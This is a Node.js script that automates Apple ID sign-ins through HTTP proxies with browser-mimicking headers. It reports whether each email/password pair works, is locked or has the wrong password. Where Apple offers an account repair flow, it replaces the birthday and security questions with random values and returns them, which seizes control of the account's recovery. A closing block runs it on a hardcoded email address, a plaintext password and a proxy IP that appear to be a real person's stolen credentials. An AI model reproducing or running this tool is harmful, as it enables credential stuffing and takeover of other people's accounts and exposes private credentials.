const cheerio = require('cheerio');
const axios = require('axios-https-proxy-fix');
const { GSASRPAuthenticator } = require('./GSASRPAuthenticator');
const { randomString, randomBirthdate } = require('./helper');

const instance = axios.create({
  timeout: 20000
})

const getFrameId = () => {
  for (var e = "auth-" + Math.random().toString(36).substr(2, 8), t = 1; t <= 3; t++)
    e += "-" + Math.random().toString(36).substr(2, 4);
  return e + "-" + Math.random().toString(36).substr(2, 8)
}

const repair = (proxy, widgetKey) => {
  return new Promise((resolve) => {
    let config = {
      method: 'get',
      proxy,
      maxBodyLength: Infinity,
      url: `https://appleid.apple.com/widget/account/repair?widgetKey=${widgetKey}&rv=1&language=en_US_USA`,
    };

    instance.request(config)
      .then((response) => {
        resolve(response?.headers['set-cookie'])
      })
      .catch((error) => {
        if (!error?.response?.status) {
          resolve(false)
        } else {
          resolve(error.response?.headers['set-cookie'])
        }
      });
  })
}

const initSRP = (proxy, bodyData) => {
  var data = JSON.stringify(bodyData);
  return new Promise((resolve) => {
    let config = {
      method: 'post',
      proxy,
      maxBodyLength: Infinity,
      url: `https://idmsa.apple.com/appleauth/auth/signin/init`,
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://idmsa.apple.com',
        'Referer': 'https://idmsa.apple.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
      },
      data: data
    };

    instance.request(config)
      .then((response) => {
        resolve(response?.data)
      })
      .catch((error) => {
        console.log("initSRP failed!")
        resolve(false)
      });
  })
}

const loginIdApple = (proxy, proof) => {
  var data = JSON.stringify({
    ...proof,
    rememberMe: true,
    trustTokens: []
  });
  return new Promise((resolve) => {
    let config = {
      method: 'post',
      proxy,
      maxBodyLength: Infinity,
      url: `https://idmsa.apple.com/appleauth/auth/signin/complete`,
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://idmsa.apple.com',
        'Referer': 'https://idmsa.apple.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
      },
      data: data
    };

    instance.request(config)
      .then((response) => {
        resolve({ cookies: response?.headers['set-cookie'], headers: response?.headers })
      })
      .catch((error) => {
        if (error?.response?.status == 409) {
          resolve("CHBM")
        } else if (error?.response?.status == 401) {
          resolve("sai pass")
        } else if (error?.response?.status == 412) {
          resolve({ cookies: error?.response?.headers['set-cookie'], headers: error?.response?.headers })
        } else {
          resolve(false)
        }
      });
  })
}

const getConfigRequest = (proxy, frame_id) => {
  const url = `https://idmsa.apple.com/appleauth/auth/authorize/signin?frame_id=${frame_id}&language=en_us&skVersion=7&iframeId=${frame_id}&client_id=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&redirect_uri=https://appleid.apple.com&response_type=code&response_mode=web_message&state=${frame_id}&authVersion=latest`;
  return new Promise((resolve) => {
    var options = {
      'method': 'GET',
      proxy,
      'url': url,
      'headers': {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
      }
    };
    instance.request(options)
      .then(function (response) {
        const $ = cheerio.load(response.data);
        let id = null;
        $('.boot_args').each((index, element) => {
          const text = $(element).text();
          if (text.includes("appleOAuth")) {
            const jsonObj = JSON.parse(text);
            id = jsonObj?.direct?.appleOAuth?.requestor?.id
          }
        })
        resolve(id)
      })
      .catch((e) => {
        resolve(false);
      });
  })
}

const option = (proxy, sessionId, sessionToken, widgetId) => {
  return new Promise((resolve) => {
    let config = {
      method: 'get',
      maxBodyLength: Infinity,
      proxy,
      url: 'https://appleid.apple.com/account/manage/repair/options',
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Referer': 'https://appleid.apple.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Apple-ID-Session-Id': sessionId,
        'X-Apple-Mandate-Security-Upgrade': '0',
        'X-Apple-Session-Token': sessionToken,
        'X-Apple-Skip-Repair-Attributes': '[]',
        'X-Apple-Widget-Key': widgetId,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"'
      }
    };

    instance.request(config)
      .then((response) => {
        if (response?.data?.security?.birthday) {
          resolve({ type: "birthday", headers: response.headers })
        } else if (response?.data?.security?.questions) {
          resolve({ type: "questions", headers: response.headers })
        } else {
          resolve(false)
        }
      })
      .catch((error) => {
        if (error?.response?.data?.security?.birthday) {
          resolve({ type: "birthday", headers: response.headers })
        } else if (error?.response?.data?.security?.questions) {
          resolve({ type: "questions", headers: response.headers })
        } else {
          resolve(false)
        }
      });
  })
}

const repairBirthDay = (proxy, sessionId, sessionToken, scnt, widgetId) => {
  let birthday = randomBirthdate();
  let data = JSON.stringify({
    "security": {
      "birthday": birthday
    }
  });
  return new Promise((resolve) => {
    let config = {
      method: 'put',
      maxBodyLength: Infinity,
      proxy,
      url: 'https://appleid.apple.com/account/manage/repair',
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Length': '0',
        'Content-Type': 'application/json',
        'Origin': 'https://appleid.apple.com',
        'Referer': 'https://appleid.apple.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Apple-ID-Session-Id': sessionId,
        'scnt': scnt,
        'X-Apple-Mandate-Security-Upgrade': '0',
        'X-Apple-Session-Token': sessionToken,
        'X-Apple-Skip-Repair-Attributes': '[]',
        'X-Apple-Widget-Key': widgetId,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'Cookie': 'dslang=US-EN; site=USA'
      },
      data: data
    };

    instance.request(config)
      .then(function (response) {
        resolve(birthday);
      })
      .catch(function (error) {
        resolve(false);
      });
  })
}

const repairQuestions = (proxy, sessionId, sessionToken, scnt, widgetId) => {
  let answer1 = randomString(10);
  let answer2 = randomString(10);
  let answer3 = randomString(10);
  let data = JSON.stringify({
    "security": {
      "questions": [
        {
          "id": "130",
          "question": "What is the first name of your best friend in high school?",
          "answer": answer1,
          "number": 1
        },
        {
          "id": "136",
          "question": "What is your dream job?",
          "answer": answer2,
          "number": 2
        },
        {
          "id": "142",
          "question": "In what city did your parents meet?",
          "answer": answer3,
          "number": 3
        }
      ]
    }
  });
  return new Promise((resolve) => {
    let config = {
      method: 'put',
      maxBodyLength: Infinity,
      proxy,
      url: 'https://appleid.apple.com/account/manage/repair/questions',
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Length': '0',
        'Content-Type': 'application/json',
        'Origin': 'https://appleid.apple.com',
        'Referer': 'https://appleid.apple.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'X-Apple-ID-Session-Id': sessionId,
        'scnt': scnt,
        'X-Apple-Mandate-Security-Upgrade': '0',
        'X-Apple-Session-Token': sessionToken,
        'X-Apple-Skip-Repair-Attributes': '[]',
        'X-Apple-Widget-Key': widgetId,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'Cookie': 'dslang=US-EN; site=USA'
      },
      data: data
    };

    instance.request(config)
      .then(function (response) {
        resolve([`What is the first name of your best friend in high school?|${answer1}|What is your dream job?|${answer2}|In what city did your parents meet?|${answer3}`]);
      })
      .catch(function (error) {
        resolve(false);
      });
  })
}

const CHBMAppleID = (email, pass, proxyString) => {
  return new Promise(async (resolve) => {
    const frame_id = getFrameId();
    const proxyArr = proxyString.split(":");
    const proxy = {
      protocol: 'http',
      host: proxyArr[0],
      port: parseInt(proxyArr[1])
    }
    let birthday = '';
    try {
      setTimeout(() => {
        resolve({
          mail: email,
          pass: pass,
          proxy: proxyString,
          status: 'not checked'
        })
      }, 300000);
      for (let index = 0; index < 2; index++) {
        let widgetKey = await getConfigRequest(proxy, frame_id);
        if(!widgetKey) {
          return resolve({
            mail: email,
            pass: pass,
            proxy: proxyString,
            status: 'not checked'
          })
        }
        // set up SRP authenticator & get public key
        let authenticator = new GSASRPAuthenticator(email);
        let initData = await authenticator.getInit();
        // request SRP init data from server
        let initResp = await initSRP(proxy, initData);
        if (initResp) {
          // get proof of password
          let proof = await authenticator.getComplete(pass, initResp);
          // send proof to server
          let completeResp = await loginIdApple(proxy, proof);
          if (typeof completeResp === "string") {
            return resolve({
              mail: email,
              pass: pass,
              proxy: proxyString,
              status: 'checked',
              note: completeResp
            })
          } else if (completeResp) {
            let { headers } = completeResp;
            let aidsp = null;
            const repairCookies = await repair(proxy, widgetKey);
            if (Array.isArray(repairCookies) && headers) {
              for (const c of repairCookies) {
                if (c.includes("aidsp=")) {
                  let carr = c.split(";")
                  aidsp = carr[0]?.split("=")?.[1]
                }
              }
              let optionHeader = await option(proxy, aidsp, headers['x-apple-repair-session-token'], widgetKey);
              if (optionHeader) {
                let type = optionHeader.type;
                optionHeader = optionHeader.headers;
                if (type == 'birthday') {
                  birthday = await repairBirthDay(proxy, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
                  index--;
                  continue;
                } else if (type == 'questions') {
                  const questions = await repairQuestions(proxy, aidsp, optionHeader['x-apple-session-token'], optionHeader['scnt'], widgetKey);
                  if (questions) {
                    return resolve({
                      mail: email,
                      pass: pass,
                      proxy: proxyString,
                      status: 'checked',
                      note: 'successfully',
                      questions: questions,
                      birthday
                    })
                  }
                }
              } else {
                return resolve({
                  mail: email,
                  pass: pass,
                  proxy: proxyString,
                  status: 'checked',
                  note: 'CHBM'
                })
              }
            } else {
              break;
            }
          } else {
            return resolve({
              mail: email,
              pass: pass,
              proxy: proxyString,
              status: 'checked',
              note: 'locked'
            })
          }
        }
      }
      return resolve({
        mail: email,
        pass: pass,
        proxy: proxyString,
        status: 'not checked'
      })
    } catch (error) {
      console.log(error);
      return resolve({
        mail: email,
        pass: pass,
        proxy: proxyString,
        status: 'not checked'
      })
    }
  })
}

(async () => {
  let a = await CHBMAppleID("gentry_phillps@hotmail.com", "7UFcfEdD865@", "38.174.39.200:3128");
  console.log(a);
})()

module.exports = {
  CHBMAppleID
};
